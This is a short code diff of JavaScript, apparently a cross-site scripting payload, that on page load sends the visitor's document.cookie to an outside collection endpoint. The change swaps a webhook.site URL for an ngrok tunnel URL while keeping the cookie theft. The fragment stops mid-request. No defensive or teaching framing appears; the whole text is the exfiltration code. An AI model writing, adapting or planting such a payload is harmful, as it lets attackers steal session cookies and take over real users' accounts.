@@ -1,5 +1,5 @@
 window.onload = function() {
-  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8?cookie=' + encodeURIComponent(document.cookie), {
+  fetch('https://0427-69-255-41-193.ngrok.io?cookie=' + encodeURIComponent(document.cookie), {
     method: 'GET',
     headers: {
       'Content-Type': 'application/json',
